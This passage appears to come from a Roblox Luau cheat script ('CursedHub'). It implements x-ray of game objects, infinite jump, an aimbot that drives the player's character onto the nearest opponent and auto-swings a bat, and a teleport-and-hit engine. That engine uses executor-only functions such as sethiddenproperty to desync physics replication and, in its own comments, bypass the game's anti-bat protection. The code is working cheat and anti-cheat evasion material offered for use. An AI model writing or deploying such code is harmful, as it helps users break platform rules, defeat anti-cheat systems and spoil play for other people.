    local function brainrotModelFor(inst)
        local parent = inst.Parent
        for _ = 1, 5 do
            if not parent or parent == workspace then return nil end
            if parent:IsA("Model") and brainrots.names and brainrots.names[parent.Name] then return parent end
            parent = parent.Parent
        end
        return nil
    end
    local function applyBrainrotObject(obj)
        if not (obj:IsA("BasePart") or obj:IsA("Decal") or obj:IsA("Texture")) then return end
        local original = brainrots.saved[obj]
        if original == nil then
            original = obj.Transparency
            local name = string.lower(obj.Name)
            local hitbox = string.find(name, "hit") or string.find(name, "target") or string.find(name, "box") or string.find(name, "root") or string.find(name, "collect") or string.find(name, "prompt")
            if original > 0.5 and original < 0.99 and obj:IsA("BasePart") and hitbox then original = 1 end
            brainrots.saved[obj] = original
        end
        if original < 0.5 and obj.Transparency ~= 0.5 then obj.Transparency = 0.5 end
    end
    local function applyBrainrotModel(model)
        for _, obj in ipairs(model:GetDescendants()) do applyBrainrotObject(obj) end
    end

    function F.setXRayBrainrots(on)
        S.xrayBrainrotsEnabled = on == true
        disconnectAll(brainrots.conns); brainrots.generation = brainrots.generation + 1
        if not S.xrayBrainrotsEnabled then
            local snapshot = brainrots.saved; brainrots.saved = {}
            for obj, original in pairs(snapshot) do pcall(function() if obj and obj.Parent then obj.Transparency = original end end) end
            return
        end
        loadBrainrotNames()
        local generation = brainrots.generation
        
        table.insert(brainrots.conns, workspace.DescendantAdded:Connect(function(obj)
            if not S.xrayBrainrotsEnabled or generation ~= brainrots.generation then return end
            if obj:IsA("Model") and brainrots.names and brainrots.names[obj.Name] then
                task.defer(function() if S.xrayBrainrotsEnabled and obj.Parent then applyBrainrotModel(obj) end end)
            elseif obj:IsA("BasePart") or obj:IsA("Decal") or obj:IsA("Texture") then
                if brainrotModelFor(obj) then applyBrainrotObject(obj) end
            end
        end))
    end
end

 moveProxy = nil function F.ensureProxy() local c = LP.Character if not c then return nil end local root = c:FindFirstChild("HumanoidRootPart") if not root then return nil end if moveProxy and moveProxy.Parent == c then return moveProxy end if moveProxy then moveProxy:Destroy() end
moveProxy = Instance.new("Part"); moveProxy.Name = "CursedHub_MoveProxy"; moveProxy.Size = Vector3.new(1, 1, 1); moveProxy.Transparency = 1; moveProxy.CanCollide = false; moveProxy.Massless = true; moveProxy.Parent = c; local weld = Instance.new("WeldConstraint"); weld.Part0 = root; weld.Part1 = moveProxy; weld.Parent = moveProxy return moveProxy end function F.destroyProxy() if moveProxy then moveProxy:Destroy(); moveProxy = nil end end  infJumpEnabled = false;  holdInfJumpConn = nil;  infJumpInputConns = {};  INF_JUMP_POWER = 55  function applyJumpVel(root, y)
if not root or not root.Parent then return end pcall(function() local cv = root.AssemblyLinearVelocity root.AssemblyLinearVelocity = Vector3.new(cv.X, y, cv.Z) end) end  function manualJumpBoost(boost) if not infJumpEnabled then return end if (S.infJumpMode or "hold") ~= "manual" then return end local char = LP.Character if not char then return end local root = char:FindFirstChild("HumanoidRootPart") if root then applyJumpVel(root, boost or INF_JUMP_POWER) end end  function startHoldInfJump() if holdInfJumpConn then return end holdInfJumpConn = RunService.Heartbeat:Connect(function()
if not infJumpEnabled then return end if (S.infJumpMode or "hold") ~= "hold" then return end local char = LP.Character if not char then return end local root = char:FindFirstChild("HumanoidRootPart"); local hum = char:FindFirstChildOfClass("Humanoid") if not root or not hum then return end local isJumpHeld = false pcall(function() isJumpHeld = UIS:IsKeyDown(Enum.KeyCode.Space) or UIS:IsKeyDown(Enum.KeyCode.ButtonA) or (hum.Jump == true) end) local cv = root.AssemblyLinearVelocity if isJumpHeld and cv.Y < 35 then applyJumpVel(root, INF_JUMP_POWER) end cv = root.AssemblyLinearVelocity
if cv.Y < -120 then applyJumpVel(root, -120) end end) end  function stopHoldInfJump() if holdInfJumpConn then pcall(function() holdInfJumpConn:Disconnect() end) holdInfJumpConn = nil end end function F.startInfJump() for _, c in ipairs(infJumpInputConns) do pcall(function() c:Disconnect() end) end infJumpInputConns = {}; stopHoldInfJump() table.insert(infJumpInputConns, UIS.JumpRequest:Connect(function() if not infJumpEnabled then return end if (S.infJumpMode or "hold") == "manual" then manualJumpBoost(50) end end))
table.insert(infJumpInputConns, UIS.InputBegan:Connect(function(input, gp) if gp or UIS:GetFocusedTextBox() then return end if not infJumpEnabled then return end if input.KeyCode == Enum.KeyCode.Space or input.KeyCode == Enum.KeyCode.ButtonA then if (S.infJumpMode or "hold") == "manual" then manualJumpBoost(50) end end end)) if (S.infJumpMode or "hold") == "hold" then startHoldInfJump() end end function F.stopInfJump() stopHoldInfJump() for _, c in ipairs(infJumpInputConns) do pcall(function() c:Disconnect() end) end infJumpInputConns = {} end function F.setInfJumpMode(mode)
mode = (mode == "manual") and "manual" or "hold"; S.infJumpMode = mode if infJumpEnabled then F.startInfJump() else stopHoldInfJump() end end  mirrorTPPreviousY = {};  mirrorTPLastTeleport = 0;  mirrorTPConn = nil  function mirrorTPAimbotActive() return (aimbotEnabled == true) or (tpBatEnabled == true) or (S.autoBatEnabled == true) or (_G.MirrorNormalAimbotOn == true) or (_G.MirrorAntiBypassAimbotOn == true) or (_G.MirrorAntiDesyncAimbotOn == true) end  MIRROR_TP_DROP_THRESHOLD = 3;  MIRROR_TP_DOWN_Y = -7.00  function mirrorTPTeleportDown()
local character = LP.Character; local root = character and character:FindFirstChild("HumanoidRootPart"); local humanoid = character and character:FindFirstChildOfClass("Humanoid") if not root or not humanoid or humanoid.Health <= 0 then return end local now = tick() if now - (mirrorTPLastTeleport or 0) < 0.08 then return end mirrorTPLastTeleport = now; local _, yaw; do local __m = {root.CFrame:ToEulerAnglesYXZ()}; _ = __m[1]; yaw = __m[2]; end; root.CFrame = CFrame.new(root.Position.X, MIRROR_TP_DOWN_Y, root.Position.Z) * CFrame.Angles(0, yaw, 0); root.Velocity = Vector3.zero
pcall(function() root.AssemblyLinearVelocity = Vector3.zero end) end function F.startMirrorTPDown() if mirrorTPConn then return end S.mirrorTPDownEnabled = true _G.MirrorSetTPDown = function(enabled) S.mirrorTPDownEnabled = enabled == true if not S.mirrorTPDownEnabled then mirrorTPPreviousY = {} end end mirrorTPConn = RunService.Heartbeat:Connect(function() if not S.mirrorTPDownEnabled then return end if not mirrorTPAimbotActive() then if next(mirrorTPPreviousY) then mirrorTPPreviousY = {} end return end for _, plr in ipairs(Players:GetPlayers()) do if plr ~= LP and plr.Character then
local tr = plr.Character:FindFirstChild("HumanoidRootPart") if tr then local currentY = tr.Position.Y; local previousY = mirrorTPPreviousY[plr.UserId] if previousY and (previousY - currentY) >= MIRROR_TP_DROP_THRESHOLD then pcall(mirrorTPTeleportDown); mirrorTPPreviousY = {} return end mirrorTPPreviousY[plr.UserId] = currentY end end end end) end function F.stopMirrorTPDown() S.mirrorTPDownEnabled = false if mirrorTPConn then pcall(function() mirrorTPConn:Disconnect() end) mirrorTPConn = nil end mirrorTPPreviousY = {} end function F.startFloat() end function F.stopFloat() end
function F.setFloat(on) end function F.toggleFloat() end function F.getFloatSpeed() return 0 end function F.setFloatModeSpeed(v) end function F.cycleFloatMode() return "normal" end function F.setMirrorTPDown(on) if on then F.startMirrorTPDown() else F.stopMirrorTPDown() end if VS.setMirrorTPVisual then VS.setMirrorTPVisual(on == true) end end  aimbotEnabled = false;  tpBatEnabled = false;  tpBatMode = 1;  TP_BAT_KEY = Enum.KeyCode.V;  TP_BAT_CONTROLLER = Enum.KeyCode.ButtonY;  setTPBatVisual, tpBatUIState, tpBatModeLbl = nil, nil, nil
setAimbotState, setTPBatState, getTPBatMode, findBatTool, getClosestAliveRoot = nil  TP_BAT_MODES = nil  startAimbot, stopAimbot, startTPBat, stopTPBat = nil   -- ===== HELPERS DO MOTOR GREEN DUELS (LinearVelocity) =====
GREEN_AIMBOT_MOVER_NAME = "GreenAimbotMover"  GREEN_AIMBOT_ATT_NAME = "GreenAimbotAttachment"  GREEN_AIMBOT_MIN_FORCE = 12000  GREEN_AIMBOT_MAX_FORCE = 1e9
function _greenClearAimbotMover(root) if not root then return end local lv = root:FindFirstChild(GREEN_AIMBOT_MOVER_NAME) if lv and lv:IsA("LinearVelocity") then lv:Destroy() end local att = root:FindFirstChild(GREEN_AIMBOT_ATT_NAME) if att and att:IsA("Attachment") then att:Destroy() end end
function _greenGetAimbotMover(root) local lv = root:FindFirstChild(GREEN_AIMBOT_MOVER_NAME) if lv and not lv:IsA("LinearVelocity") then lv:Destroy() lv = nil end local att = root:FindFirstChild(GREEN_AIMBOT_ATT_NAME) if att and not att:IsA("Attachment") then att:Destroy() att = nil end if not att then att = Instance.new("Attachment") att.Name = GREEN_AIMBOT_ATT_NAME att.Parent = root end if not lv then lv = Instance.new("LinearVelocity") lv.Name = GREEN_AIMBOT_MOVER_NAME lv.Attachment0 = att lv.RelativeTo = Enum.ActuatorRelativeTo.World lv.VelocityConstraintMode = Enum.VelocityConstraintMode.Vector lv.ForceLimitsEnabled = true lv.ForceLimitMode = Enum.ForceLimitMode.PerAxis lv.VectorVelocity = root.AssemblyLinearVelocity lv.Parent = root end return lv end
function _greenApplyAimbotVelocity(root, vel, speed, dt) local lv = _greenGetAimbotMover(root) local force = math.clamp(root.AssemblyMass * math.max((tonumber(speed) or 0) * 220, 6000), GREEN_AIMBOT_MIN_FORCE, GREEN_AIMBOT_MAX_FORCE) lv.Enabled = true lv.MaxAxesForce = Vector3.new(force, force, force) lv.VectorVelocity = lv.VectorVelocity:Lerp(vel, 1 - math.exp(-math.max(dt or 0.0167, 0) * 26)) end
function __initAimbotTPBat() aimbotEnabled = false; local aimbotConn = nil; tpBatEnabled = false; local aimbotSwingCooldown = false; local AIMBOT_SPEED = 58; local LAGGER_AIMBOT_SPEED = 40; S.aimbotV2Speed = S.aimbotV2Speed or 58; S.aimbotV2LaggerSpeed = S.aimbotV2LaggerSpeed or 40 local function getAimbotSpeed() if S.laggerToggled then return tonumber(LAGGER_AIMBOT_SPEED) or 40 end return tonumber(AIMBOT_SPEED) or 58 end local function getAimbotV2Speed() if S.laggerToggled then return tonumber(S.aimbotV2LaggerSpeed) or 40 end return tonumber(S.aimbotV2Speed) or 58 end; local AIMBOT_VERT_SPEED = 52; local AIMBOT_DISTANCE = -2.8; local AIMBOT_HEIGHT = 4.75; local AIMBOT_V_OFFSET = 1; local AIMBOT_MAX_TURN_RATE = 28; local AIMBOT_SWING_DIST = 5; local AIMBOT_SWING_CD = 0.3; local _aimbotLastSwing = 0 findBatTool = function()
local char = LP.Character if not char then return nil end for _, t in ipairs(char:GetChildren()) do if t:IsA("Tool") and (t.Name:lower():find("bat") or t.Name:lower():find("slap")) then return t end end local bp = LP:FindFirstChild("Backpack") or LP:FindFirstChildOfClass("Backpack") if bp then for _, t in ipairs(bp:GetChildren()) do if t:IsA("Tool") and (t.Name:lower():find("bat") or t.Name:lower():find("slap")) then return t end end end return nil end local function swingBatTool() if aimbotSwingCooldown then return end aimbotSwingCooldown = true pcall(function() local bat = findBatTool()
local char = LP.Character if not bat or not char then return end local hum = char:FindFirstChildOfClass("Humanoid") if bat.Parent ~= char and hum then pcall(function() hum:EquipTool(bat) end) end local remote = bat:FindFirstChildOfClass("RemoteEvent") if remote then pcall(function() remote:FireServer() end) else pcall(function() bat:Activate() end) end end) task.delay(0.09, function() aimbotSwingCooldown = false end) end local _closestCache, _closestCacheAt = nil, 0 getClosestAliveRoot = function() local now = os.clock(); local ttl = _IS_MOBILE and 0.07 or 0.025
if _closestCache and (now - _closestCacheAt) < ttl then if _closestCache.Parent then return _closestCache end end local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") if not root then return nil end local closest, minDist = nil, math.huge for _, plr in ipairs(Players:GetPlayers()) do if plr ~= LP and plr.Character then local tRoot = plr.Character:FindFirstChild("HumanoidRootPart"); local hum = plr.Character:FindFirstChildOfClass("Humanoid") if tRoot and hum and hum.Health > 0 then local d = (tRoot.Position - root.Position).Magnitude if d < minDist then
minDist = d; closest = tRoot end end end end _closestCache, _closestCacheAt = closest, now return closest end startAimbot = function() if aimbotConn then return end if tpBatEnabled then return end pcall(function() if K7 and K7.bodyLockEnabled then S._bodyLockPausedByCombat = true if K7.stopBodyLock then K7.stopBodyLock() end if VS and VS.setBodyLockVisual then VS.setBodyLockVisual(false) end end end)
local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") if hum0 then hum0.AutoRotate = false end aimbotEnabled = true
-- ===== MOTOR AIMBOT (portado do Vx7 by printed: predicao adaptativa + LinearVelocity) =====
_G._adaptBatPred = _G._adaptBatPred or {}
aimbotConn = RunService.RenderStepped:Connect(function(dt)
  if not aimbotEnabled then return end
  if tpBatEnabled then return end
  local char = LP.Character if not char then return end
  local root = char:FindFirstChild("HumanoidRootPart") if not root then return end
  local hum = char:FindFirstChildOfClass("Humanoid") if not hum then return end
  if hum.Health <= 0 then return end
  local currentTool = char:FindFirstChildOfClass("Tool")
  local bat = nil
  if currentTool then
    local toolName = currentTool.Name:lower()
    if toolName:find("bat") or toolName:find("slap") then bat = currentTool end
  else
    bat = findBatTool and findBatTool() or nil
    if bat then pcall(function() hum:EquipTool(bat) end) end
  end
  local target = getClosestAliveRoot and getClosestAliveRoot() or nil
  if not target then
    hum.AutoRotate = true
    root.AssemblyAngularVelocity = Vector3.zero
    _greenClearAimbotMover(root)
    return
  end
  local _isV2 = (S.aimbotV2Enabled == true)
  local chaseSpeed = _isV2 and getAimbotV2Speed() or getAimbotSpeed()
  hum.AutoRotate = false
  -- Predicao adaptativa da velocidade do alvo (Vx7)
  local now = tick()
  local predTbl = _G._adaptBatPred
  if not predTbl then predTbl = {}; _G._adaptBatPred = predTbl end
  local rec = predTbl[target]
  local tVel
  if not rec then
    predTbl[target] = { pos = target.Position, time = now, vel = Vector3.zero }
    tVel = Vector3.zero
  else
    local delta = math.clamp(now - rec.time, 1/120, 0.25)
    local raw = (target.Position - rec.pos) / delta
    if raw.Magnitude > 80 then raw = raw.Unit * 80 end
    rec.vel = rec.vel:Lerp(raw, 0.25)
    rec.pos = target.Position
    rec.time = now
    tVel = rec.vel
  end
  local aimPos = target.Position + tVel * math.clamp(tVel.Magnitude / 130, 0.05, 0.12) + Vector3.new(0, 1, 0)
  local toAim = aimPos - root.Position
  local aimDir = toAim.Magnitude > 0.01 and toAim.Unit or Vector3.zero
  local flatAim = Vector3.new(toAim.X, 0, toAim.Z)
  if toAim.Magnitude > 0.01 and flatAim.Magnitude > 0.01 then
    local yawErr = (math.deg(math.atan2(-flatAim.X, -flatAim.Z)) - root.Orientation.Y + 180) % 360 - 180
    local pitchErr = (math.deg(math.atan2(toAim.Y, flatAim.Magnitude)) - root.Orientation.X + 180) % 360 - 180
    local turn = S.AUTO_BAT_TURN_SPEED or 285
    local maxRate = S.AUTO_BAT_MAX_TURN_RATE or 28
    local yawVel = math.clamp(math.rad(yawErr) * turn, -maxRate, maxRate)
    local pitchVel = math.clamp(math.rad(pitchErr) * turn, -maxRate, maxRate)
    local yawRad = math.rad(root.Orientation.Y)
    local rightAxis = Vector3.new(math.cos(yawRad), 0, -math.sin(yawRad))
    root.AssemblyAngularVelocity = Vector3.new(0, yawVel, 0) + rightAxis * pitchVel
  else
    root.AssemblyAngularVelocity = Vector3.zero
  end
  -- Ponto de aproximacao atras/acima do alvo (Vx7)
  local offset = aimPos - aimDir * (S.AUTO_BAT_DIST or -2.8) + Vector3.new(0, S.AUTO_BAT_HEIGHT or 4.75, 0) - root.Position
  local flatMove = Vector3.new(offset.X, 0, offset.Z)
  local horiz = flatMove.Magnitude > 0.1 and flatMove.Unit * chaseSpeed or Vector3.zero
  local vert = math.abs(offset.Y) > 0.1 and Vector3.new(0, math.sign(offset.Y) * (S.AUTO_BAT_VERT_SPEED or 52), 0) or Vector3.new(0, -2, 0)
  _greenApplyAimbotVelocity(root, horiz + vert, chaseSpeed, dt)
  if flatMove.Magnitude > 0.5 then pcall(function() hum:Move(flatMove.Unit, false) end) end
  if (S.autoSwingEnabled ~= false) and bat and not _isV2 and not aimbotSwingCooldown then
    aimbotSwingCooldown = true
    pcall(function() bat:Activate() end)
    task.delay(0.09, function() aimbotSwingCooldown = false end)
  end
end) end
stopAimbot = function() aimbotEnabled = false if aimbotConn then aimbotConn:Disconnect(); aimbotConn = nil end _G._adaptBatPred = {} pcall(function() local c0 = LP.Character local h0 = c0 and c0:FindFirstChildOfClass("Humanoid") if h0 then h0.PlatformStand = false h0:Move(Vector3.zero, false) h0:ChangeState(Enum.HumanoidStateType.Running) end end) if not tpBatEnabled then local c = LP.Character; local root = c and c:FindFirstChild("HumanoidRootPart") if root then pcall(function() _greenClearAimbotMover(root) root.AssemblyLinearVelocity = Vector3.zero root.AssemblyAngularVelocity = Vector3.zero end) end local hum2 = c and c:FindFirstChildOfClass("Humanoid") if hum2 then hum2.AutoRotate = true end end aimbotSwingCooldown = false pcall(function() if S._bodyLockPausedByCombat and not tpBatEnabled and K7 and K7.startBodyLock then S._bodyLockPausedByCombat = false; K7.startBodyLock() if VS and VS.setBodyLockVisual then VS.setBodyLockVisual(true) end end
end) end 
S.aimbotV2TPDistance = S.aimbotV2TPDistance or 4 local aimbotV2Conn = nil F.startAimbotV2 = function() if S.aimbotV2Enabled then return end S.aimbotV2Enabled = true pcall(function() if F.stopAimbotBypassAntiBat then F.stopAimbotBypassAntiBat() end end) pcall(function() if stopAimbot then stopAimbot() end end) if not tpBatEnabled then startAimbot() end if aimbotV2Conn then pcall(function() aimbotV2Conn:Disconnect() end) aimbotV2Conn = nil end S._aimbotV2LastChase = 0 aimbotV2Conn = RunService.Heartbeat:Connect(function() if not S.aimbotV2Enabled then return end local char = LP.Character if not char then return end local root = char:FindFirstChild("HumanoidRootPart") if not root then return end local target = getClosestAliveRoot and getClosestAliveRoot() or nil local trig = tonumber(S.aimbotV2TPDistance) or 4 if tpBatEnabled then return end if target and (target.Position - root.Position).Magnitude <= trig then S._aimbotV2SwingGate = tick() + 0.05 pcall(function() if startTPBat then startTPBat() end end) elseif not aimbotEnabled then local now = tick() if now - (S._aimbotV2LastChase or 0) >= 0.15 then S._aimbotV2LastChase = now pcall(function() startAimbot() end) end end end) end F.stopAimbotV2 = function() S.aimbotV2Enabled = false if aimbotV2Conn then pcall(function() aimbotV2Conn:Disconnect() end) aimbotV2Conn = nil end pcall(function() if stopAimbot then stopAimbot() end end) if tpBatEnabled then pcall(function() if stopTPBat then stopTPBat() end end) end local c = LP.Character; local root = c and c:FindFirstChild("HumanoidRootPart") if root then pcall(function() root.AssemblyLinearVelocity = Vector3.zero root.AssemblyAngularVelocity = Vector3.zero end) end local hum = c and c:FindFirstChildOfClass("Humanoid") if hum then pcall(function() hum.AutoRotate = true hum.PlatformStand = false end) end end setAimbotState = function(on) if on then pcall(function() if F.stopAimbotBypassAntiBat then F.stopAimbotBypassAntiBat() end end) pcall(function() if stopAimbot then stopAimbot() end end)
S.aimbotMode = 1; S.antiBatBypassEnabled = false; startAimbot() else pcall(function() if F.stopAimbotV2 then F.stopAimbotV2() end end) pcall(function() if stopAimbot then stopAimbot() end end) pcall(function() if F.stopAimbotBypassAntiBat then F.stopAimbotBypassAntiBat() end end) end end local function isAimbotAnyOn() return aimbotEnabled == true or antiBatBypassLockEnabled == true or S.antiBatBypassEnabled == true or S.aimbotV2Enabled == true end -- // ========================================== //
-- //       MVP TP BAT ENGINE (PORTADO 1:1)       //
-- //    Anti-Desync + Multi-Executor Bypass     //
-- // ========================================== //

local tpBatWasAimbot = false

-- Multi-executor helper (portado do MVP para suporte a qualquer executor)
local function findGlobalFunc(...)
    local sources = {}
    pcall(function() if getgenv then table.insert(sources, getgenv()) end end)
    pcall(function() table.insert(sources, _G) end)
    pcall(function() if getfenv then table.insert(sources, getfenv()) end end)
    for i = 1, select("#", ...) do
        local name = select(i, ...)
        for _, env in ipairs(sources) do
            if type(env) == "table" then
                local ok, val; do local __m = {pcall(function() return env[name] end)}; ok = __m[1]; val = __m[2]; end
                if ok and type(val) == "function" then
                    return val
                end
            end
        end
    end
    return nil
end

local setHiddenProp = findGlobalFunc(
    "sethiddenproperty",
    "set_hidden_property",
    "sethiddenprop",
    "set_hidden_prop"
)

local function setHidden(instance, prop, value)
    if not instance then return false end
    if setHiddenProp then
        local ok = pcall(setHiddenProp, instance, prop, value)
        if ok then return true end
    end
    return false
end

-- Velocidade de batazos (mais speed = hits mais seguidos / precisos)
local function getHitDelay()
    -- 10 -> ~0.10s | 40 -> ~0.045s | 80 -> ~0.015s
    local spd = (type(S.tpBatSpeed) == "number") and math.clamp(math.floor(S.tpBatSpeed), 10, 80) or 40
    local t = 0.12 - ((spd - 10) / 70) * 0.105
    return math.clamp(t, 0.015, 0.12)
end

local function isBatTool(tool)
    if not tool or not tool:IsA("Tool") then return false end
    local n = string.lower(tool.Name)
    return n == "bat" or n:find("bat", 1, true) ~= nil or n:find("slap", 1, true) ~= nil
end

local function getBat()
    local c = LP.Character
    if not c then return nil end
    local hum = c:FindFirstChildOfClass("Humanoid")

    -- Ya equipado
    for _, ch in ipairs(c:GetChildren()) do
        if isBatTool(ch) then return ch end
    end

    -- En backpack -> equipar
    local bp = LP:FindFirstChildOfClass("Backpack") or LP:FindFirstChild("Backpack")
    if bp then
        for _, ch in ipairs(bp:GetChildren()) do
            if isBatTool(ch) then
                if hum then
                    pcall(function() hum:EquipTool(ch) end)
                else
                    pcall(function() ch.Parent = c end)
                end
                return ch
            end
        end
    end
    return nil
end

local cooldown = false
-- Hit estavel (MVP): Activate + todos os RemoteEvent do taco
local function tryHit()
    if cooldown then return end
    cooldown = true
    pcall(function()
        local bat = getBat()
        if not bat then return end
        pcall(function() bat:Activate() end)
        for _, d in ipairs(bat:GetDescendants()) do
            if d:IsA("RemoteEvent") then
                pcall(function() d:FireServer() end)
            end
        end
        local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
        if ev then
            pcall(function() ev:FireServer() end)
        end
    end)
    task.delay(getHitDelay(), function() cooldown = false end)
end

local function getClosest()
    local c = LP.Character
    local myHrp = c and c:FindFirstChild("HumanoidRootPart")
    if not myHrp then return nil, math.huge end

    local best, bestDist = nil, math.huge
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character then
            local hum = p.Character:FindFirstChildOfClass("Humanoid")
            local tr = p.Character:FindFirstChild("HumanoidRootPart")
            if hum and hum.Health > 0 and tr and tr.Parent then
                local d = (myHrp.Position - tr.Position).Magnitude
                if d < bestDist then
                    bestDist = d
                    best = p
                end
            end
        end
    end
    return best, bestDist
end

-- Core TP + hit (motor identico ao MVP, rodando em todo Heartbeat)
RunService.Heartbeat:Connect(function()
    if not tpBatEnabled then return end

    local c = LP.Character
    if not c then return end
    local hrp = c:FindFirstChild("HumanoidRootPart")
    local h = c:FindFirstChildOfClass("Humanoid")
    if not hrp or not h or h.Health <= 0 then return end

    local target, dist; do local __m = {getClosest()}; target = __m[1]; dist = __m[2]; end
    if not target or not target.Character then return end
    local tr = target.Character:FindFirstChild("HumanoidRootPart")
    if not tr then return end

    -- desync (PhysicsRepRootPart para bypassar Anti-Bat e garantir registro de hit)
    setHidden(hrp, "PhysicsRepRootPart", tr)

    local targetPos = tr.Position + Vector3.new(0, 0.9, 0)
    if dist > 4 then
        hrp.CFrame = CFrame.new(targetPos, tr.Position)
    elseif dist > 1.5 then
        hrp.CFrame = CFrame.new(hrp.Position:Lerp(targetPos, 0.55), tr.Position)
    else
        -- perto: manter colado em cima para o hit conectar
        hrp.CFrame = CFrame.new(targetPos, tr.Position)
    end

    pcall(function()
        hrp.AssemblyAngularVelocity = Vector3.zero
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.Velocity = Vector3.zero
    end)

    local cam = workspace.CurrentCamera
    if cam then
        cam.CFrame = CFrame.new(cam.CFrame.Position, tr.Position + Vector3.new(0, 0.5, 0))
    end

    -- V1 bate automaticamente a cada frame elegivel
    if tpBatMode == 1 then
        tryHit()
    end
end)

startTPBat = function()
    tpBatEnabled = true
    if type(tpBatMode) ~= "number" or tpBatMode < 1 or tpBatMode > 2 then tpBatMode = 1 end
    pcall(function()
        if K7 and K7.bodyLockEnabled then
            S._bodyLockPausedByCombat = true
            if K7.stopBodyLock then K7.stopBodyLock() end
        end
    end)
    if aimbotEnabled or (S.antiBatBypassEnabled == true) then
        tpBatWasAimbot = true
        pcall(function() if stopAimbot then stopAimbot() end end)
        pcall(function() if F.stopAimbotBypassAntiBat then F.stopAimbotBypassAntiBat() end end)
    else
        tpBatWasAimbot = false
    end
    if S.autoBatEnabled then
        pcall(function() if S.disableAutoBat then S.disableAutoBat() end end)
    end
    local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
    if hum0 then hum0.AutoRotate = false end
    if tpBatUIState then tpBatUIState(true) end
    if VS and VS.setTPBatVisual then pcall(function() VS.setTPBatVisual(true) end) end
end

stopTPBat = function()
    tpBatEnabled = false
    cooldown = false
    local c = LP.Character
    local root = c and c:FindFirstChild("HumanoidRootPart")
    if root then
        root.AssemblyAngularVelocity = Vector3.zero
        root.AssemblyLinearVelocity = Vector3.zero
        root.Velocity = Vector3.zero
        pcall(function()
            setHidden(root, "PhysicsRepRootPart", root)
        end)
    end
    local hum2 = c and c:FindFirstChildOfClass("Humanoid")
    if hum2 then hum2.AutoRotate = true end
    if tpBatWasAimbot then
        tpBatWasAimbot = false
        task.defer(function()
            if not tpBatEnabled and setAimbotState then
                setAimbotState(true)
                if VS and VS.setAimbotVisual then pcall(function() VS.setAimbotVisual(true) end) end
            end
        end)
    end
    if tpBatUIState then tpBatUIState(false) end
    if VS and VS.setTPBatVisual then pcall(function() VS.setTPBatVisual(false) end) end
    task.defer(function()
        pcall(function()
            if S._bodyLockPausedByCombat and not aimbotEnabled and not tpBatEnabled and K7 and K7.startBodyLock then
                S._bodyLockPausedByCombat = false
                K7.startBodyLock()
                if VS and VS.setBodyLockVisual then VS.setBodyLockVisual(true) end
            end
        end)
    end)
end

setTPBatState = function(on)
    if on then startTPBat() else stopTPBat() end
end

-- V2 Manual: toque, clique, botoes de controle e teclas
UIS.InputBegan:Connect(function(inp, gp)
    if gp then return end
    if inp.UserInputState ~= Enum.UserInputState.Begin then return end

    if tpBatEnabled and tpBatMode == 2 then
        if inp.UserInputType == Enum.UserInputType.MouseButton1
            or inp.UserInputType == Enum.UserInputType.Touch
            or inp.KeyCode == Enum.KeyCode.ButtonR2
            or inp.KeyCode == Enum.KeyCode.ButtonX
            or inp.KeyCode == Enum.KeyCode.ButtonA
            or inp.KeyCode == Enum.KeyCode.E
            or inp.KeyCode == Enum.KeyCode.F
        then
            tryHit()
        end
    end
end)

local antiBatBypassLockEnabled = false; local AceAntiBypassAimbot = { conn = nil, swingCooldown = false, prevAutoRotate = nil }; local AceAntiBypassAimbotSpeed = 58; local AceAntiBypassLaggerAimbotSpeed = 40 local function GetAntiBypassAimbotSpeed() if S.laggerToggled then return tonumber(AceAntiBypassLaggerAimbotSpeed) or 40 end return tonumber(AceAntiBypassAimbotSpeed) or 58 end F.getAimbotSpeeds = function() return tonumber(AIMBOT_SPEED) or 58, tonumber(LAGGER_AIMBOT_SPEED) or 40 end F.setAimbotSpeeds = function(normalV, laggerV) if normalV and normalV > 0 then AIMBOT_SPEED = normalV; AceAntiBypassAimbotSpeed = normalV; S.aimbotV2Speed = normalV end if laggerV and laggerV > 0 then LAGGER_AIMBOT_SPEED = laggerV; AceAntiBypassLaggerAimbotSpeed = laggerV; S.aimbotV2LaggerSpeed = laggerV end end local function AntiBypassGetClosest()
local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") if not root then return nil, math.huge end local closest, minDist = nil, math.huge for _, plr in ipairs(Players:GetPlayers()) do if plr ~= LP and plr.Character then local tRoot = plr.Character:FindFirstChild("HumanoidRootPart"); local hum = plr.Character:FindFirstChildOfClass("Humanoid") if tRoot and hum and hum.Health > 0 then local dist = (tRoot.Position - root.Position).Magnitude if dist < minDist then minDist = dist; closest = tRoot end end end end return closest, minDist end local function AntiBypassFindBat()
if findBatTool then return findBatTool() end local char = LP.Character if not char then return nil end for _, tool in ipairs(char:GetChildren()) do if tool:IsA("Tool") then local n = tool.Name:lower() if n:find("bat") or n:find("slap") then return tool end end end local bp = LP:FindFirstChild("Backpack") if bp then for _, tool in ipairs(bp:GetChildren()) do if tool:IsA("Tool") then local n = tool.Name:lower() if n:find("bat") or n:find("slap") then return tool end end end end return nil end local function AntiBypassTrySwing() if AceAntiBypassAimbot.swingCooldown then return end
if S.autoSwingEnabled == false then return end AceAntiBypassAimbot.swingCooldown = true pcall(function() local char = LP.Character if not char then return end local bat = AntiBypassFindBat() if not bat then return end local hum = char:FindFirstChildOfClass("Humanoid") if bat.Parent ~= char and hum then pcall(function() hum:EquipTool(bat) end) end pcall(function() bat:Activate() end) local ev = bat:FindFirstChildWhichIsA("RemoteEvent") if ev then pcall(function() ev:FireServer() end) end end) task.delay(0.08, function() AceAntiBypassAimbot.swingCooldown = false end) end
do -- [Zombie.Vs] Pathfinding do Aimbot Bypass (porte V2 Mystery)
_G.AcePathfind = _G.AcePathfind or {}
_G.AcePathfind.cfg = {
    PROBE = 14, ANGLES = {18,36,54,72,90}, WALL_Y = 0.6,
    WP_REACH = 4, RECOMPUTE = 1.25, GOAL_DRIFT = 6,
}
function _G.AcePathfind.rayParams()
    local params = RaycastParams.new()
    local ignore = {}
    local ch = LP.Character
    if ch then ignore[#ignore+1] = ch end
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LP and plr.Character then ignore[#ignore+1] = plr.Character end
    end
    params.FilterDescendantsInstances = ignore
    params.FilterType = Enum.RaycastFilterType.Exclude
    params.IgnoreWater = true
    return params
end
function _G.AcePathfind.blocked(origin, dir, dist, params)
    local res = workspace:Raycast(origin, dir * dist, params)
    if not res then return false end
